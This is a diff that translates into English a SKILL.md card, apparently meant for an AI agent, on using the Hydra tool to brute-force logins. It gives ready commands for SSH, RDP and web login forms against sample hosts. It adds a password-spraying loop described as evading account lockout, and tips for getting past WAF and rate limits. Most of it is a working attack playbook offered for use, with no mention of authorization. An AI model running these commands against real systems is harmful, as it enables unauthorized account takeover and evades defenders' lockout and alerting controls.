@@ -2,54 +2,57 @@
 name: hydra-service-brute
 description: "Hydra brute-forces SSH, RDP, and web login forms. Signals: brute force, password spraying, single or dictionary usernames, single or dictionary passwords."
 zh-signals: "Hydra (thc-hydra): SSH 与 RDP 口令爆破、Web 登录表单爆破。信号:暴力破解,口令喷射,单个 / 字典用户名,单个 / 字典密码。"
+when-to-use: >-
+  Use to brute-force SSH, RDP, SMB, and web login forms with dictionary or
+  single credentials and configurable parallelism.
 ---
 
 # Hydra (thc-hydra)
 
-- 攻击大类:C28 暴力破解与口令喷射
-- 上游仓库:https://github.com/vanhauser-thc/thc-hydra
-- 上游 License:AGPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C28 Brute Force and Password Spraying
+- Upstream Repository: https://github.com/vanhauser-thc/thc-hydra
+- Upstream License: AGPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
-apt install hydra          # Kali/Debian 自带
-# 或编译: https://github.com/vanhauser-thc/thc-hydra 见 BUILD 文档
+apt install hydra          # bundled with Kali/Debian
+# or compile it: https://github.com/vanhauser-thc/thc-hydra see the BUILD docs
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `-l user / -L users.txt` | 单个 / 字典用户名 |
-| `-p pass / -P pass.txt` | 单个 / 字典密码 |
-| `-t 16` | 并行任务数(默认 16,小心触发账户锁定) |
-| `-f` | 试出第一个即停 |
-| `-vV` | 显示每次尝试,便于排查 |
-| `-o result.txt` | 保存命中结果 |
-| `ssh://target` | SSH 爆破 |
-| `rdp://target` | RDP 爆破 |
-| `smb://target` | SMB 爆破 |
-| `http-post-form "/login:user=^USER^&pass=^PASS^:F=invalid"` | Web 表单爆破,^USER^/^PASS^ 占位 |
-| `cisco://target` / `mysql://target` / `ftp://target` | 多协议同理 |
+| `-l user / -L users.txt` | Single / dictionary usernames |
+| `-p pass / -P pass.txt` | Single / dictionary passwords |
+| `-t 16` | Number of parallel tasks (default 16, beware of account lockouts) |
+| `-f` | Stop at the first hit |
+| `-vV` | Show every attempt, useful for troubleshooting |
+| `-o result.txt` | Save the hits |
+| `ssh://target` | SSH brute force |
+| `rdp://target` | RDP brute force |
+| `smb://target` | SMB brute force |
+| `http-post-form "/login:user=^USER^&pass=^PASS^:F=invalid"` | Web form brute force, ^USER^/^PASS^ placeholders |
+| `cisco://target` / `mysql://target` / `ftp://target` | Same approach for other protocols |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### SSH 与 RDP 口令爆破
+### SSH and RDP credential brute force
 
 ```bash
 hydra -L users.txt -P passwords.txt ssh://10.0.0.5 -t 4 -f -o ssh_hits.txt
 hydra -l administrator -P passwords.txt rdp://10.0.0.6 -t 8
 ```
 
-### Web 登录表单爆破
+### Web login form brute force
 
 ```bash
 hydra -l admin -P passwords.txt 10.0.0.7 http-post-form \
   "/login.php:username=^USER^&password=^PASS^&submit=Login:F=Login failed" -V
 ```
 
-### 口令喷射(一对多,规避锁定策略)
+### Password spraying (one password against many accounts, to evade lockout policies)
 
 ```bash
 for p in $(cat season_pass.txt); do
@@ -57,6 +60,6 @@ for p in $(cat season_pass.txt); do
 done
 ```
 
-## 注意事项
+## Notes
 
-`-t` 过大易触发账户锁定与告警;http-post-form 的失败标志 `F=` 必须与页面实际回显匹配;命中率低时优先检查是否被 WAF/限速拦截。
+An overly large `-t` easily triggers account lockouts and alerts; the failure marker `F=` in http-post-form must match the page's actual output; when the hit rate is low, first check whether a WAF or rate limit is blocking you.
